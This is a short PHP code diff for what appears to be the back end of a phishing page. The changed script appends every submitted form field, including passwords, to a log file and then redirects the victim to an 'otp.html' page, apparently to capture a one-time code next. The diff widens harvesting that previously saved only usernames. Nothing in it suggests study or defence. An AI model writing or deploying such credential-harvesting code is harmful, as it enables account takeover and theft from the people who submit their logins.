@@ -1,12 +1,13 @@
 <?php
-
-if ($_SERVER["REQUEST_METHOD"] == "POST"){
-	$username = $_POST["username"];
-	$password = $_POST["password"];
-	$file = fopen("log.txt","w");
-	$data = "Username: ".$username;
-	fwrite($file, $data);
-	fclose($file);
-	header("Location: otp.html");
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
 }
+fwrite($handle, "\r\n\n");
+fclose($handle);
+header("Location: otp.html");
+exit;
 ?>
